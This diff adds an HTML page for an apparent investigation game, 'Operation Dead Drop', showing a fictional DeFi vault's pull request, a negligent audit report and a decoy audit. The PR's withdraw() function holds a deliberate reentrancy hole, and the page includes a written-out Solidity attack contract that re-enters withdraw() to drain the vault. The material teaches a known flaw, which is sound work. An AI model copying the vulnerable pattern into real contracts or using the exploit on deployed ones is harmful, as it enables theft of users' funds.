@@ -1,0 +1,206 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Smart Contracts — Operation Dead Drop</title>
+    <link rel="icon" type="image/webp" href="/assets/images/icons/icon-code.webp">
+    <link rel="stylesheet" href="shared.css">
+    <style>
+        .sc-file { background: var(--ow-surface); border: 1px solid var(--ow-border); border-radius: 6px; margin-bottom: 16px; overflow: hidden; }
+        .sc-file-header { display: flex; justify-content: space-between; align-items: center; padding: 10px 14px; background: #0d1117; border-bottom: 1px solid var(--ow-border); cursor: pointer; }
+        .sc-file-header:hover { background: #111622; }
+        .sc-file-name { font-family: Consolas, monospace; font-size: 0.78rem; color: var(--ow-accent); }
+        .sc-file-meta { font-size: 0.6rem; color: var(--ow-text-dim); }
+        .sc-file-body { display: none; padding: 0; }
+        .sc-file.expanded .sc-file-body { display: block; }
+        .sc-code { background: #060610; padding: 14px; font-family: Consolas, monospace; font-size: 0.68rem; line-height: 1.5; color: #a0a0b0; overflow-x: auto; white-space: pre; }
+        .sc-code .kw { color: #c678dd; }
+        .sc-code .fn { color: #61afef; }
+        .sc-code .str { color: #98c379; }
+        .sc-code .cm { color: #5c6370; font-style: italic; }
+        .sc-code .vuln { background: rgba(220,38,38,0.1); display: inline; padding: 1px 4px; border-radius: 2px; color: #fca5a5; }
+        .sc-diff-add { background: rgba(34,197,94,0.08); border-left: 3px solid var(--ow-green); padding-left: 8px; }
+        .sc-audit { background: var(--ow-surface); border: 1px solid var(--ow-border); border-radius: 6px; padding: 16px; }
+        .sc-audit-header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 12px; }
+        .sc-audit-badge { font-size: 0.6rem; padding: 3px 8px; border-radius: 3px; font-weight: bold; }
+    </style>
+</head>
+<body>
+<h1 class="visually-hidden">Operation Dead Drop — Smart Contracts</h1>
+
+<script src="../../engine/OpenWorldEngine.js"></script>
+<script src="config-shared.js"></script>
+<script>
+    DeadDropConfig.activePage = 'contracts';
+    const engine = new OpenWorldEngine(DeadDropConfig);
+    engine.init();
+</script>
+
+<div class="ow-content">
+    <div class="ow-section-label">VaultGuard Protocol — Smart Contract Source</div>
+
+    <!-- PR #847 Diff -->
+    <div class="sc-file" id="sc-pr847">
+        <div class="sc-file-header" onclick="toggleSc('sc-pr847')">
+            <div>
+                <div class="sc-file-name">PR #847: Add _beforeTokenTransfer hook <span style="color:var(--ow-green);font-size:0.6rem;">+47 -2</span></div>
+                <div class="sc-file-meta">Merged Feb 28, 2026 | Author: marcus-weber-blockshield | Reviewer: vaultguard-dev-team</div>
+            </div>
+            <span class="sc-file-meta">Click to expand</span>
+        </div>
+        <div class="sc-file-body">
+            <div style="padding:10px 14px;font-size:0.7rem;color:var(--ow-text-dim);border-bottom:1px solid var(--ow-border);">
+                Commit message: "Add transfer hook for compliance module integration. Reviewed by BlockShield audit team."
+            </div>
+            <div class="sc-code"><span class="cm">// VaultGuard.sol — PR #847 diff</span>
+<span class="cm">// File: contracts/core/VaultGuard.sol</span>
+
+<span class="sc-diff-add"><span class="cm">+ // Compliance hook — called before any token transfer</span>
++ <span class="kw">function</span> <span class="fn">_beforeTokenTransfer</span>(address from, address to, uint256 amount) <span class="kw">internal</span> {
++     <span class="kw">if</span> (from != address(0) && to != address(0)) {
++         <span class="vuln">IComplianceModule(complianceAddr).onTransfer(from, to, amount);</span>
++     }
++ }</span>
+
+  <span class="kw">function</span> <span class="fn">withdraw</span>(uint256 amount) <span class="kw">external</span> {
+      <span class="kw">require</span>(balances[msg.sender] >= amount, <span class="str">"Insufficient balance"</span>);
+
+<span class="sc-diff-add">+     <span class="vuln">_beforeTokenTransfer(address(this), msg.sender, amount);</span></span>
+
+      <span class="cm">// Send ETH to the caller</span>
+      <span class="vuln">(bool success, ) = msg.sender.call{value: amount}(<span class="str">""</span>);</span>
+      <span class="kw">require</span>(success, <span class="str">"Transfer failed"</span>);
+
+      <span class="cm">// Update balance AFTER sending — <span class="vuln">REENTRANCY VULNERABILITY</span></span>
+      balances[msg.sender] -= amount;
+  }</div>
+            <div style="padding:10px 14px;font-size:0.68rem;color:var(--ow-text-dim);border-top:1px solid var(--ow-border);">
+                <strong style="color:var(--ow-accent);">Analysis:</strong> The _beforeTokenTransfer hook calls an external contract (complianceAddr) BEFORE the balance is updated.
+                If the compliance contract is attacker-controlled, it can call back into withdraw() — draining the vault recursively.
+                The fix: move <code>balances[msg.sender] -= amount</code> BEFORE the external call (Checks-Effects-Interactions pattern).
+                <div style="margin-top:8px;cursor:pointer;font-size:0.65rem;color:var(--ow-accent);" onclick="pinSc('sc-vuln-pr')">[Pin as Evidence]</div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Audit Report -->
+    <div class="sc-audit" id="sc-audit">
+        <div class="sc-audit-header">
+            <div>
+                <div style="font-size:0.9rem;font-weight:bold;color:var(--ow-text-bright);">BlockShield Security Audit Report</div>
+                <div style="font-size:0.7rem;color:var(--ow-text-dim);">VaultGuard Protocol v2.1 | March 1, 2026</div>
+            </div>
+            <span class="sc-audit-badge" style="background:rgba(34,197,94,0.15);color:var(--ow-green);border:1px solid rgba(34,197,94,0.3);">PASSED</span>
+        </div>
+        <div style="font-size:0.75rem;line-height:1.6;color:var(--ow-text);">
+            <p><strong>Auditor:</strong> Marcus Weber, Lead Security Researcher, BlockShield Security</p>
+            <p><strong>Scope:</strong> All contracts in /contracts/core/ including PR #847 additions</p>
+            <p><strong>Duration:</strong> February 25 - March 1, 2026 (5 days)</p>
+            <p><strong>Methodology:</strong> Manual code review + Slither static analysis + Echidna fuzzing</p>
+
+            <div style="margin:12px 0;padding:10px;background:#060610;border-radius:4px;font-size:0.7rem;">
+                <strong>Finding Summary:</strong><br>
+                Critical: 0 | High: 0 | Medium: 1 (resolved) | Low: 2 (acknowledged) | Informational: 4<br><br>
+                <strong>PR #847 Review:</strong><br>
+                _beforeTokenTransfer hook: <strong style="color:var(--ow-green);">Low Risk</strong> — Standard compliance integration pattern.
+                The hook calls a trusted compliance module and does not introduce reentrancy risk as the compliance contract
+                is owned by the protocol team.<br><br>
+                <em>"The _beforeTokenTransfer implementation follows the standard OpenZeppelin hook pattern and poses no additional
+                risk to the withdraw function."</em> — M. Weber
+            </div>
+
+            <p style="color:var(--ow-text-dim);font-size:0.65rem;">
+                Digital Signature: Marcus Weber (BlockShield Security)<br>
+                PGP Key: 0xA1B2C3D4E5F6<br>
+                Report Hash: SHA256:7f3a9c2e1b4d6f8a...
+            </p>
+        </div>
+        <div style="margin-top:8px;cursor:pointer;font-size:0.65rem;color:var(--ow-accent);" onclick="pinSc('sc-audit-report')">[Pin as Evidence]</div>
+    </div>
+
+    <!-- Reentrancy explanation -->
+    <div class="sc-file" id="sc-reent" style="margin-top:16px;">
+        <div class="sc-file-header" onclick="toggleSc('sc-reent')">
+            <div>
+                <div class="sc-file-name">Exploit Reconstruction — Reentrancy Analysis</div>
+                <div class="sc-file-meta">Post-incident analysis by VaultGuard team</div>
+            </div>
+        </div>
+        <div class="sc-file-body">
+            <div class="sc-code"><span class="cm">// Attack contract (reconstructed from on-chain bytecode decompilation)</span>
+
+<span class="kw">contract</span> <span class="fn">VaultGuardExploit</span> {
+    IVaultGuard <span class="kw">immutable</span> vault;
+    uint256 counter;
+
+    <span class="kw">constructor</span>(address _vault) {
+        vault = IVaultGuard(_vault);
+    }
+
+    <span class="kw">function</span> <span class="fn">attack</span>() <span class="kw">external</span> {
+        <span class="cm">// Deposit 100 ETH to establish a balance</span>
+        vault.deposit{value: 100 ether}();
+        <span class="cm">// Begin recursive withdrawal</span>
+        vault.withdraw(100 ether);
+    }
+
+    <span class="cm">// This is called by _beforeTokenTransfer via the compliance module</span>
+    <span class="cm">// The attacker SET THEMSELVES as the compliance module address</span>
+    <span class="kw">function</span> <span class="fn">onTransfer</span>(address, address, uint256) <span class="kw">external</span> {
+        <span class="kw">if</span> (counter < 47) {
+            counter++;
+            <span class="vuln">vault.withdraw(100 ether);</span> <span class="cm">// Re-enter withdraw()</span>
+        }
+    }
+
+    <span class="kw">receive</span>() <span class="kw">external payable</span> {}
+}
+
+<span class="cm">// The key: withdraw() calls _beforeTokenTransfer() BEFORE updating balances.</span>
+<span class="cm">// _beforeTokenTransfer() calls complianceAddr.onTransfer().</span>
+<span class="cm">// If complianceAddr == attacker contract, onTransfer() calls withdraw() again.</span>
+<span class="cm">// Balance is still 100 ETH because it hasn't been decremented yet.</span>
+<span class="cm">// Result: 47 recursive withdrawals of 100 ETH = 4,700 ETH drained</span>
+<span class="cm">// (limited by block gas limit, not by balance check)</span></div>
+            <div style="padding:10px 14px;font-size:0.68rem;color:var(--ow-text-dim);border-top:1px solid var(--ow-border);">
+                <div style="cursor:pointer;font-size:0.65rem;color:var(--ow-accent);" onclick="pinSc('sc-reentrancy')">[Pin as Evidence]</div>
+            </div>
+        </div>
+    </div>
+
+    <!-- CertiK audit (red herring) -->
+    <div class="sc-audit" style="margin-top:16px;opacity:0.7;">
+        <div class="sc-audit-header">
+            <div>
+                <div style="font-size:0.85rem;font-weight:bold;color:var(--ow-text-bright);">CertiK Audit Report</div>
+                <div style="font-size:0.7rem;color:var(--ow-text-dim);">VaultGuard Protocol v2.0 | January 15, 2026</div>
+            </div>
+            <span class="sc-audit-badge" style="background:rgba(34,197,94,0.15);color:var(--ow-green);border:1px solid rgba(34,197,94,0.3);">PASSED</span>
+        </div>
+        <div style="font-size:0.72rem;color:var(--ow-text-dim);">
+            <p>CertiK audited VaultGuard v2.0 in January 2026. <strong>This audit did NOT cover PR #847</strong> — the malicious code was added after CertiK's review window closed.</p>
+            <p>CertiK's audit scope ended at commit <code>a4b7c1d</code> (Jan 10). PR #847 was merged at commit <code>e8f2d3a</code> (Feb 28).</p>
+        </div>
+        <div style="margin-top:8px;cursor:pointer;font-size:0.65rem;color:var(--ow-text-dim);" onclick="pinSc('rh-other-auditor')">[Pin — but note: this is a different audit]</div>
+    </div>
+</div>
+
+<script>
+function toggleSc(id) {
+    var el = document.getElementById(id);
+    if (el) el.classList.toggle('expanded');
+}
+
+function pinSc(evidenceId) {
+    if (!evidenceId || engine.isEvidencePinned(evidenceId)) return;
+    var ev = DeadDropConfig.evidence[evidenceId];
+    if (ev) {
+        engine.pinEvidence({ id: evidenceId, ...ev });
+        engine.openFile(evidenceId);
+    }
+}
+</script>
+
+</body>
+</html>
